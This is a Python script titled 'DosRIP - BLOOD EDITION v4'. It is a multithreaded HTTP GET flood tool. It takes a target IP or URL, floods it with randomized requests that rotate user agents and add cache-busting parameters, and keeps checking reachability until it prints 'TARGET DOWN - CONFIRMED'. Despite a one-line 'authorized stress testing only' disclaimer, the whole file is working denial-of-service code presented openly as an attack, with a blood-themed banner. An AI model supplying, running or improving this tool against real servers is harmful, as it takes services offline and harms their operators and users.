#!/usr/bin/env python3
# ============================================================
#   DosRIP - BLOOD EDITION v4
#   by Injector | Authorized security stress testing ONLY
# ============================================================

import socket
import threading
import time
import sys
import random
import string
import os
from urllib.parse import urlparse

# ---------------- CONFIG ----------------
MAX_THREADS_LIMIT = 100
REQUEST_TIMEOUT = 3
DOWN_THRESHOLD = 3
# -----------------------------------------

# ---------- BLOOD PALETTE ----------
R1  = "\033[38;5;52m"
R2  = "\033[38;5;88m"
R3  = "\033[38;5;124m"
R4  = "\033[38;5;160m"
R5  = "\033[38;5;196m"
W   = "\033[97m"
GY  = "\033[90m"
G   = "\033[92m"
Y   = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"

lock = threading.Lock()
sent_packets = 0
failed_packets = 0
stop_event = threading.Event()
rate_limit = 0
_token_bucket = threading.Semaphore(0)
log_count = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

BANNER = [
    (R1, " ██████╗  ██████╗ ███████╗██████╗ ██╗██████╗ "),
    (R2, " ██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║██╔══██╗"),
    (R3, " ██║  ██║██║   ██║███████╗██████╔╝██║██████╔╝"),
    (R4, " ██║  ██║██║   ██║╚════██║██╔═══╝ ██║██╔═══╝"),
    (R5, " ██████╔╝╚██████╔╝███████║██║     ██║██║"),
    (R5, " ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝"),
]


def random_payload(size=512):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))


def build_request(host, path="/"):
    return (
        f"GET {path}?cache={random.randint(0, 999999)} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        f"X-Load: {random_payload()}\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()


def bucket_filler():
    interval = 1.0 / rate_limit
    while not stop_event.is_set():
        _token_bucket.release()
        time.sleep(interval)


# ---------------- LIVE LOG ----------------
def log_line(ip, port, ok):
    """One colored line per request, scrolling fast down the screen."""
    global log_count
    with lock:
        log_count += 1
        n = log_count
    if ok:
        color = R5
        status = "HIT"
    else:
        color = R2
        status = "FAIL"
    t = time.strftime("%H:%M:%S")
    sys.stdout.write(
        f"{color}[{t}] #{n:<7} >> GET {ip}:{port} ... {status}{RESET}\n"
    )
    sys.stdout.flush()


def flood_worker(ip, port, path):
    global sent_packets, failed_packets
    while not stop_event.is_set():
        if rate_limit > 0:
            _token_bucket.acquire()
        if stop_event.is_set():
            return
        ok = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(REQUEST_TIMEOUT)
            sock.connect((ip, port))
            sock.sendall(build_request(ip, path))
            try:
                sock.recv(2048)
            except socket.timeout:
                pass
            sock.close()
            ok = True
        except OSError:
            time.sleep(0.05)
        with lock:
            sent_packets += 1
            if not ok:
                failed_packets += 1
        log_line(ip, port, ok)


def check_alive(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.close()
        return True
    except OSError:
        return False


# ---------------- BLOOD DRIP UNDER THE TEXT ----------------
def blood_drip():
    """Banner prints, then blood drips stream down BELOW the letters."""
    print()
    for color, line in BANNER:
        print(f"{BOLD}{color}{line}{RESET}")
        time.sleep(0.08)

    # find drip columns inside the text area (where letters have holes)
    drip_cols = [6, 12, 18, 24, 30, 36, 42, 48, 54, 60]
    print()  # drip zone starts BELOW the banner
    for depth in range(1, 6):
        line = [" "] * 62
        for c in drip_cols:
            for d in range(depth):
                if c + d * 0 < 62:
                    line[c] = "|"
                    if depth > d + 1:
                        pass
        # draw stacked drips: longer tails as depth grows
        out = ""
        for c in drip_cols:
            out += " " * c + R5 + "|" * depth + RESET + "\r"
        sys.stdout.write(out)
        sys.stdout.flush()
        time.sleep(0.15)
    print()
    print(f"{R5}{BOLD}     >>> DosRIP loaded - blood flows below. <<<{RESET}")
    print(f"{GY}     Authorized stress testing only.{RESET}\n")
    time.sleep(0.4)


def slow_print(text, color=R3, delay=0.012):
    for c in text:
        sys.stdout.write(f"{color}{c}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    print()


def ask(prompt):
    try:
        return input(f"{R5}{BOLD}{prompt}{RESET}{W} ").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n{Y}[!] Aborted.{RESET}")
        sys.exit(0)


# ---------------- DOWN CHECKER (prints over the log stream) ----------------
def down_checker(ip, port):
    down_count = 0
    last_alive = True
    while not stop_event.is_set():
        time.sleep(2)
        alive = check_alive(ip, port)
        if alive:
            down_count = 0
            if not last_alive:
                print(f"{G}[+] Target back ONLINE{RESET}")
                last_alive = True
        else:
            down_count += 1
            last_alive = False
            print(f"{R5}{BOLD}[!] Target unreachable ({down_count}/{DOWN_THRESHOLD}){RESET}")
            if down_count >= DOWN_THRESHOLD:
                print(f"\n{R5}{BOLD}{'=' * 50}")
                print(f"  [X] TARGET DOWN - CONFIRMED")
                print(f"{'=' * 50}{RESET}")
                stop_event.set()
                return


def main():
    if sys.platform == "win32":
        os.system("")
    sys.stdout.reconfigure(errors="ignore")

    blood_drip()
    slow_print("  [1] DOS ATTACK - TARGET SERVER STRESS", color=R5)
    print(f"{R1}  {'-' * 42}{RESET}\n")

    target = ask("  Target (IP or URL):")
    if "://" in target:
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
    else:
        host, port, path = target, 80, "/"

    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(f"{R5}[!] Invalid host. Exiting.{RESET}")
        return

    while True:
        try:
            threads_count = int(ask(f"  Threads (1-{MAX_THREADS_LIMIT}):"))
            if 1 <= threads_count <= MAX_THREADS_LIMIT:
                break
            print(f"{R5}[!] Max is {MAX_THREADS_LIMIT}.{RESET}")
        except ValueError:
            print(f"{R5}[!] Enter a number.{RESET}")

    while True:
        try:
            rate_limit = int(ask("  Speed limit req/s (0 = MAX):"))
            if rate_limit >= 0:
                break
            print(f"{R5}[!] Use 0 or a positive number.{RESET}")
        except ValueError:
            print(f"{R5}[!] Enter a number.{RESET}")

    print(f"\n{Y}[+] Resolved:{RESET} {host} -> {R5}{BOLD}{ip}:{port}{RESET}")
    print(f"{Y}[+] Speed : {RESET}{'UNLIMITED' if rate_limit == 0 else str(rate_limit) + ' req/s'}")
    print(f"{Y}[+] Live log streaming... CTRL+C to stop.{RESET}\n")
    time.sleep(0.3)

    if rate_limit > 0:
        threading.Thread(target=bucket_filler, daemon=True).start()

    for _ in range(threads_count):
        threading.Thread(target=flood_worker, args=(ip, port, path), daemon=True).start()
        time.sleep(0.005)

    threading.Thread(target=down_checker, args=(ip, port), daemon=True).start()

    try:
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Stopped by user.{RESET}")
        stop_event.set()
        time.sleep(0.5)

    with lock:
        total, fails = sent_packets, failed_packets
    print(f"\n{R1}{BOLD}{'-' * 50}")
    print(f"  TOTAL SENT : {total}   FAILED : {fails}")
    print(f"  DosRIP session closed. Blood dried.")
    print(f"{'-' * 50}{RESET}")


if __name__ == "__main__":
    main()
